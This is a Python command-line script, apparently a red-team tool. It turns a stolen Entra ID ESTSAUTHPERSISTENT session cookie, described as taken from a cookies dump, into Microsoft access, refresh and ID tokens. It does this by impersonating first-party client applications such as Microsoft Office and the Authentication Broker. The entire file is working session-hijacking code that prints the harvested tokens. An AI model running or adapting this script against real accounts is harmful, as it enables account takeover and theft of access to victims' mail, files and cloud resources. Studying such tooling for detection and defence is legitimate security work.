import argparse
import requests
from urllib.parse import urlparse, parse_qs

def getAccessToken(client_id: str, tenant_id: str, resource: str, estsAuthP: str):

    if any(val is None or val == "" for val in [client_id,tenant_id,resource,estsAuthP]):
        print("Error: One of the following parameters was empty")
        return
    
    # Grab redirect url based off client
    redirect_url = getClientRedirectUrl(client_id,resource)

    # Setup request to request an authorization code
    headers = {
        "Host": "login.microsoftonline.com",
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)",
        "Cookie": f"ESTSAUTHPERSISTENT={estsAuthP}"
    }
    # proxies = {
    #    "http": "http://127.0.0.1:8080",
    #    "https": "http://127.0.0.1:8080"
    # }
    getAuthCodeUri = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/authorize?redirect_uri={redirect_url}&response_type=code&scope=openid+offline_access&response_mode=query&client_id={client_id}"
    
    try:
        #response = requests.get(getAuthCodeUri, headers=headers,proxies=proxies,verify=False,allow_redirects=False)
        response = requests.get(getAuthCodeUri, headers=headers,verify=True,allow_redirects=False)


        if (response.status_code == 302 and "Location" in response.headers):
            locationHeader = response.headers["Location"]
            parsedUrl = urlparse(locationHeader)
            params = parse_qs(parsedUrl.query)
            authCode = params.get("code", [None])[0]
            
            if authCode:
                print("Successfully requested an auth code!")
                tokenUrl = f"https://login.microsoftonline.com/{tenant_id}/oauth2/token"
                payload = {
                    "client_id":client_id,
                    "scope":"openid",
                    "grant_type":"authorization_code",
                    "redirect_uri":redirect_url,
                    "resource": resource,
                    "code": authCode
                }   
                headers = {
                    "Host": "login.microsoftonline.com",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)"
                }
                # Send Post rquest for access token
                #response = requests.post(tokenUrl, data=payload,headers=headers,proxies=proxies,verify=False, timeout=10)
                response = requests.post(tokenUrl, data=payload,headers=headers,verify=True, timeout=10)

                # Check for HTTP errors
                response.raise_for_status()

                post_data = response.json()

                access_token = post_data.get("access_token")
                refresh_token = post_data.get("refresh_token")
                id_token = post_data.get("id_token")
                
                if(access_token):
                    print("Successfully requested an access token code!\n")
                    print(f"access_token: {access_token}")
                    print(f"refresh_token: {refresh_token}")
                    print(f"id_token: {id_token}")
                else:
                    print("Failed to get access token")

            else:
                print("Failed to request auth code")
                return
        else:
            print("Failed to request auth code")
            return

    except Exception as e:
        print(f"Failed to send HTTP request for authorization code: {e}")


def getClientRedirectUrl(client_id: str, resource: str):

    redirect_uri = "https://login.microsoftonline.com/common/oauth2/nativeclient"
    # List of OOB Clients
    oob_clients = [
        "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Microsoft Office # Works
        "29d9ed98-a469-4536-ade2-f981bc1d605e",  # Microsoft Authentication Broker
        "9ba1a5c7-f17a-4de9-a1f1-6178c8d51223"   # Microsoft Intune Company Portal
    ]

    # Client mappings dictionary
    client_mappings = {
        "1fec8e78-bce4-4aaf-ab1b-5451cc387264": "https://login.microsoftonline.com/common/oauth2/nativeclient",
        "9bc3ab49-b65d-410a-85ad-de819febfddc": "https://oauth.spops.microsoft.com/",
        "ab9b8c07-8f02-4f72-87fa-80105867a763": "https://login.windows.net/common/oauth2/nativeclient",
        "3d5cffa9-04da-4657-8cab-c7f074657cad": "http://localhost/m365/commerce",
        "dd762716-544d-4aeb-a526-687b73838a22": "ms-appx-web://microsoft.aad.brokerplugin/dd762716-544d-4aeb-a526-687b73838a22",

    }

    # Check clientId in clientMappings
    if client_id in client_mappings:
        return client_mappings[client_id]

    # Special condition check
    if client_id == "29d9ed98-a469-4536-ade2-f981bc1d605e" and resource != "https://enrollment.manage.microsoft.com/":
        return "ms-aadj-redir://auth/drs"

    # Check clientId in oobClients
    if client_id in oob_clients:
        return "urn:ietf:wg:oauth:2.0:oob"

    return redirect_uri


def main():

    # Initialize parser
    parser = argparse.ArgumentParser(
        description="Request Entra ID access tokens using ESTSAUTHPERSISTENT cookie",
        usage="Usage: python get-AccessTokenWithSSOCookie.py <client_id> <tenant_id> <resource> <estsAuthP>"
        )

    # Define required arguments
    parser.add_argument("client_id", type=str, help="(Required) Identifier for the client application to impersonate")
    parser.add_argument("tenant_id", type=str, help="(Required) The identifier for the target Entra ID tenant")
    parser.add_argument("resource", type=str, help="(Required) The target service/resource")
    parser.add_argument("estsAuthP", type=str, help="(Required) ESTSAUTHPERSISTENT cookie (Most likely taken from a cookies dump)")

    # Parse arguments
    args = parser.parse_args()

    getAccessToken(args.client_id,args.tenant_id,args.resource,args.estsAuthP)
    

if __name__ == '__main__':
    main()